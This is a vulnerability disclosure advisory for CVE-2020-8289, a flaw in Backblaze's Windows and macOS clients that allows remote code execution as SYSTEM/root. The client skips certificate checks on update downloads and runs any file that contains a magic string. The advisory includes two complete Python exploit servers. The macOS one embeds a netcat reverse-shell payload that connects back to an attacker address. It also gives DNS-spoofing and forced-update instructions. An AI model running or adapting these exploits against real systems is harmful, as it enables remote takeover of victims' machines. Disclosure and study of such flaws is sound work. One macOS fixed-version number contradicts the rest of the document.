# CVE-2020-8289 – Remote Code Execution as SYSTEM/root via Backblaze

## Summary
**Name:** Remote Code Execution as SYSTEM/root via Backblaze  
**CVE:** CVE-2020-8289  
**Discoverer:** Jason Geffner  
**Vendor:** Backblaze  
**Product:** Backblaze for Windows and Backblaze for macOS  
**Risk:** Critical  
**Discovery Date:** 2020-03-13  
**Publication Data:** 2020-09-09  
**Fixed Version:** `7.0.1.433` (Windows) and `7.1.0.434` (macOS)  

## Introduction
Per Wikipedia, Backblaze is

> "an online backup tool that allows Windows and macOS users to back up their data to offsite data centers. The service is designed for businesses and end-users, providing unlimited storage space and supporting unlimited file sizes." 

Vulnerable versions of Backblaze for Windows and Backblaze for macOS contain a critical risk vulnerability that allows an unprivileged anonymous remote attacker to perform remote code execution (RCE) as `SYSTEM`/`root`. 

## Vulnerability
The Backblaze client's service process, named `bzserv`, runs as `SYSTEM` on Windows and as `root` on macOS. Every couple of hours, `bzserv` runs a program named `bztransmit` (executed as `SYSTEM`/`root`) to download an XML file named `clientversion.xml` from Backblaze's data center to see if a newer version of the Backblaze client is available for download. The URL for this XML file is constructed from the `bzdatacenter` hostname in the installed `bzinstall.xml` file (read-only for unprivileged users) and the hardcoded path `api/clientversion.xml`, yielding a URL such as `https://ca000.backblaze.com/api/clientversion.xml`. This download is performed via a statically linked `libcurl` library. However, the `bztransmit` functions that leverage `libcurl` contain peculiar logic that cause them to set `CURLOPT_SSL_VERIFYPEER` to `0` and `CURLOPT_SSL_VERIFYHOST` to `0` if the given URL contains one of the following strings: 

* `.backblaze.xyz/`
* `.backblazeb2.xyz/`
* `api/clientversion.xml`
* `api/install_backblaze`

This allows a remote attacker to impersonate the web server `https://ca000.backblaze.com/` with an invalid SSL certificate (for example, a self-signed certificate) and supply the client with an attacker-controlled `clientversion.xml` file. When `bztransmit` parses the downloaded XML file, it checks to see if the latest client version described in the XML file is newer than the installed client version and if so, downloads the latest client version's installer from Backblaze's data center. The URL for this download is constructed from the `win32_url`/`mac_url` attribute in the downloaded `clientversion.xml` file; the attribute's value must start with `%DEST_HOST%` and that string is replaced at runtime with the data center hostname described above. The attacker can thus supply in their `clientversion.xml` a download URL such as `%DEST_HOST%/api/install_backblaze`, to cause bztransmit to download the installer from `https://ca000.backblaze.com/api/install_backblaze`, and again ignore the server's SSL certificate because of the `api/install_backblaze` string in the URL. If the downloaded file is not a ZIP file (for example, if it's a PE file or a Mach-o file) then the only validation of the file performed by `bztransmit` is for the file to contain the string `bzbzbzbzbzxaxbxcxdxexfxgxhxixjxkxlxmxnxoxpxqxrxsxtxuxvxwxxxyxzgromitxxkublerrossxxskiepicxxnukepavex` in a certain offset range in the file. Once this validation passes, `bztransmit` uses `ShellExecute()`/`system()` to run the downloaded file as `SYSTEM`/`root`, thereby allowing the attacker to perform RCE as `SYSTEM`/`root`. 

## Proof of Concept (Windows)
**Video:** [https://youtu.be/W0THXbcX5V8](https://youtu.be/W0THXbcX5V8)

This proof of concept is for the Windows client. We assume that the attacker has already sent a spoofed DNS response to the victim to point `ca000.backblaze.com` to the attacker's IP, but for PoC testing purposes you can instead add the line `<attacker's IP> ca000.backblaze.com` to the victim's `%windir%\System32\drivers\etc\hosts` file. The code below expects the attacker to supply `rce.exe` (which will be executed as `SYSTEM` on the victim's system) and `server.pem` (which can be self-signed). 

```python
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Proof-of-concept exploit for CVE-2020-8289 for Windows."""

__author__ = "geffner@gmail.com (Jason Geffner)"
__version__ = "1.0"


from http.server import HTTPServer, SimpleHTTPRequestHandler
import cgi
import ssl

bzmagicpat = b"bzbzbzbzbzxaxbxcxdxexfxgxhxixjxkxlxmxnxoxpxqxrxsxtxuxvxwxxxy" + \
             b"xzgromitxxkublerrossxxskiepicxxnukepavex"
with open("rce.exe", "rb") as f:
    exe = f.read()
if len(exe) > (50200 - len(bzmagicpat)):
    raise("EXE too large")
exe += bzmagicpat
exe += b"\x00" * (50304 - len(exe))

class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Length", str(len(exe)))
        self.end_headers()
        self.wfile.write(exe)

    def do_POST(self):
        self.send_response(200)
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={"REQUEST_METHOD": "POST"})
        response = str.encode(
            ' update_hguids_firstchar="' + form.getvalue("hguid")[0] + '"' +
            ' win32_version="1' + form.getvalue("version") + '"' +
            ' win32_url="%DEST_HOST%/api/install_backblaze"')
        self.send_header("Content-Length", str(len(response)))
        self.end_headers()
        self.wfile.write(response)

    def do_CONNECT(self):
        self.wfile.write("HTTP/1.1 200\r\n")
        self.end_headers()
        self.rfile = self.connection.makefile("rb", self.rbufsize)
        self.wfile = self.connection.makefile("wb", self.wbufsize)
        self.close_connection = 0

httpd = HTTPServer(("localhost", 443), Handler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem",
                               server_side=True)
httpd.serve_forever()
```

Once the code above is running, wait. The victim's client checks for an update every couple of hours. 

If you'd like to test the PoC without waiting, you can run the following commands as `SYSTEM` (using `psexec`, for example) on the victim's system to force the update check: 

* `del %ProgramData%\Backblaze\bzdata\bzupdates\bzautoupdate_2_hour_lock.lck`
* `bztransmit.exe -fetchclientversionxml`
* `bztransmit.exe -downloadautoupdateifappropriate`

## Proof of Concept (macOS)
**Video:** [https://youtu.be/ILPP1Ky5nuY](https://youtu.be/ILPP1Ky5nuY)

This proof of concept is for the macOS client. In the real world, an attacker would send a spoofed DNS response to the victim to point `ca000.backblaze.com` to the attacker's IP, but for PoC purposes, we're attacking from the same system as the victim and exploiting the compromised Backblaze service to create a remote-shell back to the attacker, thus giving the would-be-remote attacker root access.

```python
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Proof-of-concept exploit for CVE-2020-8289 for macOS."""

__author__ = "geffner@gmail.com (Jason Geffner)"
__version__ = "1.0"


from http.server import HTTPServer, SimpleHTTPRequestHandler
import cgi
import ssl

attacker_ip = "localhost"
attacker_port = 12345

reverse_shell = "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
                f"{attacker_ip} {attacker_port} >/tmp/f"
bzmagicpat = "bzbzbzbzbzxaxbxcxdxexfxgxhxixjxkxlxmxnxoxpxqxrxsxtxuxvxwxxxy" + \
             "xzgromitxxkublerrossxxskiepicxxnukepavex"
payload = reverse_shell + "\n" + bzmagicpat
payload += "A" * (50304 - len(payload))

class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload.encode())

    def do_POST(self):
        self.send_response(200)
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={"REQUEST_METHOD": "POST"})
        response = str.encode(
            ' update_hguids_firstchar="' + form.getvalue("hguid")[0] + '"' +
            ' win32_version="1' + form.getvalue("version") + '"' +
            ' mac_version="1' + form.getvalue("version") + '"' +
            ' mac_url="%DEST_HOST%/api/install_backblaze"')
        self.send_header("Content-Length", str(len(response)))
        self.end_headers()
        self.wfile.write(response)

    def do_CONNECT(self):
        self.wfile.write("HTTP/1.1 200\r\n")
        self.end_headers()
        self.rfile = self.connection.makefile("rb", self.rbufsize)
        self.wfile = self.connection.makefile("wb", self.wbufsize)
        self.close_connection = 0

httpd = HTTPServer(("localhost", 443), Handler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem",
                               server_side=True)
httpd.serve_forever()
```

Once the code above is running, wait. The victim's client checks for an update every couple of hours. 

If you'd like to test the PoC without waiting, you can run the following commands on the victim's system to force the update check: 

* `sudo rm /Library/Backblaze.bzpkg/bzdata/bzupdates/bzautoupdate_2_hour_lock.lck`
* `sudo /Library/Backblaze.bzpkg/bztransmit -fetchclientversionxml`
* `sudo /Library/Backblaze.bzpkg/bztransmit -downloadautoupdateifappropriate`

## Mitigation
Backblaze patched this vulnerability in Backblaze version `7.0.1.433` for Windows and version `7.0.1.434` for macOS.

## Discoverer
This vulnerability was discovered and reported to Backblaze by Jason Geffner via HackerOne.

## Timeline
2020-03-13 - Vulnerability discovered and reported to Backblaze via HackerOne  
2020-03-31 - HackerOne verified vulnerability  
2020-04-09 - Windows build `7.0.1.433` and macOS build `7.1.0.434` released  
2020-04-17 - CVE-2020-8150 assigned  
2020-04-18 - Vulnerability mitigation verified  
2020-04-20 - Public disclosure requested  
2020-09-09 - Public disclosure  
2020-12-22 - CVE assignment changed to CVE-2020-8289  
